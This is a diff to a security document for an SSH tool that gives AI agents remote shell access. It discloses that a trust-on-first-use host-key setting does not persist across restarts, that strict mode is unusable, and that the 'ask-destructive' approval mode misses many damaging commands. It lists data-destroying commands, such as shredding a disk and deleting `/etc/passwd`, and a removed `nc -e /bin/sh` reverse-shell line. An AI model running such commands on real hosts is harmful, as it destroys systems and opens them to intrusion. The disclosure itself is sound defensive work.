@@ -38,11 +38,11 @@ SSH MCP Server gives LLM agents the ability to execute shell commands on remote 
 
 | Risk | Mitigation |
 |------|------------|
-| Prompt injection via tool output | Command classifier + policy engine + human-in-the-loop approval for destructive commands |
+| Prompt injection via tool output | Command classifier + policy engine + human-in-the-loop approval for commands classified `destructive` or `privileged` — a narrower set than it sounds, see the `ask-destructive` note below |
 | Credential leakage via CLI args (CWE-214) | Credentials loaded from env vars / config files / SSH agent — never CLI args |
 | Sudo password in process list (CWE-522) | Sudo password piped via SSH channel stdin, not command-line `printf` |
 | Command injection via metadata | Sanitizer strips CR/LF/NUL from all metadata; `description` feature removed |
-| MITM attacks | TOFU host key verification by default, **for the life of one process** — see "Host key trust" below; `trustedHostKey` or `--hostKeyMode=strict` for trust that survives a restart |
+| MITM attacks | TOFU host key verification by default, **for the life of one process** — see "Host key trust does not survive a restart" below. `trustedHostKey` on the profile is the only control here that outlives a restart |
 | Weak SSH algorithms | Frozen algorithm allow-list per RFC 9142 (no SHA-1, no CBC, no ssh-rsa) |
 | PTY session leaks (MaxSessions) | Interactive sessions are bounded, not absent: `sessionMaxPerConnection` (default 5), `sessionIdleTimeoutMs` (10 min), `sessionBackgroundMaxMs` (1 h), and a reaper that sweeps expired sessions every 60s. One-shot commands use `exec()` and hold no channel. No persistent `su` shells |
 | Unbounded agent actions | Per-profile RBAC, rate limits, denylist, approval modes |
@@ -85,32 +85,40 @@ and exits with the client, so a fresh accept happens every session, and an attac
 positioned to intercept has to win once per start rather than once ever. The mismatch error
 that makes a swapped key visible only fires against a key this process already saw.
 
-Two settings do give trust that outlives a restart, and both are checked before the store:
+**`trustedHostKey` on the profile is the only control here that survives a restart.** Pin
+the fingerprint you expect; it is checked in `connection.ts` before the store is consulted
+at all, so an empty store does not weaken it. Use it for anything that matters.
 
-- **`trustedHostKey` on the profile** — pin the fingerprint you expect. This is the
-  strongest option and the one to use for anything that matters.
-- **`--hostKeyMode=strict`** — refuse a host whose key is not already known. Note that with
-  an empty store this refuses *every* host on a fresh start, so it is only usable together
-  with `trustedHostKey`.
+**`--hostKeyMode=strict` refuses every host, and pinning does not rescue it.** Strict rejects
+any host whose key is not already in the store, and the only write to that store is the TOFU
+accept further down the same function — unreachable once the strict branch has thrown.
+`trustedHostKey` never writes to it either. So under strict the store starts empty and stays
+empty: measured, two consecutive connections both throw `HOST_KEY_UNKNOWN` with the store
+still at zero entries, and a matching `trustedHostKey` does not change that. The mode is only
+satisfiable by a key accepted earlier in the same process under `tofu`, and the mode is fixed
+at startup, so that cannot happen. Treat strict as unusable until the code changes; use
+`trustedHostKey`.
 
 **`ask-destructive` gates less than the name suggests, and `kill` is one example rather
-than the exception.** Outside the never-allowed list, the `destructive` class is produced by
-a single pattern — `/rm\s+-rf?\s+\//` — plus elevation. Everything else that damages a
-host classifies `safe`, and `safe` raises no prompt in this mode. Measured against the
-shipped classifier, all of these are `safe`:
+than the exception.** Outside the never-allowed list, four things produce the `destructive`
+class: the pattern `/rm\s+-rf?\s+\//`, a disqualifying argument on an otherwise allowlisted
+binary (`find … -delete`, `find … -exec`), and a command word this process cannot resolve
+statically (`$VAR` as the command). Elevation classifies `privileged` rather than
+`destructive`; this mode gates both. Ordinary write verbs are in none of these. Measured against the shipped classifier, all of these are `safe`,
+and `safe` raises no prompt in this mode:
 
 ```
 rm -f /etc/passwd          mv /etc/passwd /tmp/x       truncate -s0 /etc/passwd
 rm -r -f /                 rm --recursive --force /    rm -rf ~
 shred /dev/sda             systemctl stop nginx        kill -9 <pid>
-sftp-upload (any path)     nc -e /bin/sh host 4444
 ```
 
 So `ask-destructive` buys a prompt on elevation and on `rm -rf /path`. It does not buy one
 on writes, deletions spelled another way, service control, or signals. **`ask-all` is the
 mode that gates writes**, and it is the right default for a profile pointed at anything that
 matters. A `readOnly` profile, or a role whose bindings exclude `safe`, are the other two
-controls that actually cover this set.
+controls that actually cover this set — the command set, that is, not the threat-model rows
+near the top of this file.
 
 **The blast radius is the process group, not one process.** OpenSSH answers a `signal`
 channel request with `killpg()` on the command's group (`session.c`,
@@ -134,7 +142,9 @@ dispatched but never took, and from one that could not be dispatched at all.
 
 1. **Never run as root.** Create a dedicated low-privilege service account.
 2. **Use command-specific sudoers** instead of blanket `NOPASSWD: ALL`.
-3. **Enable `ask-destructive` or `ask-all` approval mode** for production profiles.
+3. **Enable `ask-all` approval mode** for production profiles. `ask-destructive` is the
+   shipped default but gates far less than its name suggests — see the note on it below
+   before choosing it for anything that matters.
 4. **Restrict network egress** on the target host (iptables/Cilium) to prevent data exfiltration.
 5. **Use read-only profiles** (`readOnly = true`) for monitoring/observer access.
 6. **Review audit logs** regularly — all commands are logged with redaction.
@@ -184,10 +194,10 @@ is secure.
 | Control | Description | SSH MCP v2 Feature |
 |---------|-------------|-------------------|
 | CC6.1 | Logical and physical access controls | Policy engine with RBAC (viewer/operator/admin), per-profile `readOnly` flag, denylist enforcement |
-| CC6.6 | Network access security | TOFU host key verification, RFC 9142 algorithm allow-list, `via` ProxyJump without agent forwarding |
+| CC6.6 | Network access security | TOFU host key verification (per process; `trustedHostKey` to pin — see "Host key trust does not survive a restart"), RFC 9142 algorithm allow-list, `via` ProxyJump without agent forwarding |
 | CC7.1 | System monitoring | Audit log (JSONL + ECS fields), 3-layer output redaction (field/regex/entropy) |
 | CC7.2 | Detection of security events | Command classification (read-only/safe/destructive/privileged), policy denial logging |
-| CC8.1 | Change management | `approvalPolicy` modes (auto/ask-destructive/ask-all/deny), MCP elicitation for destructive commands |
+| CC8.1 | Change management | `approvalPolicy` modes (auto/ask-destructive/ask-all/deny), MCP elicitation for commands classified `destructive` or `privileged`; `ask-all` for every command |
 | CC9.1 | Risk mitigation | Credential cascade (agent > keychain > env, never CLI args), config file and directory permission checks (0600/0700), ACL check on Windows |
 
 ### PCI-DSS v4.0
@@ -219,4 +229,4 @@ is secure.
 | §164.312(b) | Audit controls | JSONL audit log with command/user/host/decision, hash-chain tamper-evidence |
 | §164.312(c)(1) | Integrity | Redaction pipeline prevents PHI leakage in logs, error hygiene |
 | §164.312(d) | Person or entity authentication | Credential cascade (agent/keychain/key/CA cert), host key verification |
-| §164.312(e)(1) | Transmission security | SSH with RFC 9142 algorithms, TOFU host key verification, no agent forwarding |
+| §164.312(e)(1) | Transmission security | SSH with RFC 9142 algorithms, TOFU host key verification (per process; `trustedHostKey` to pin), no agent forwarding |
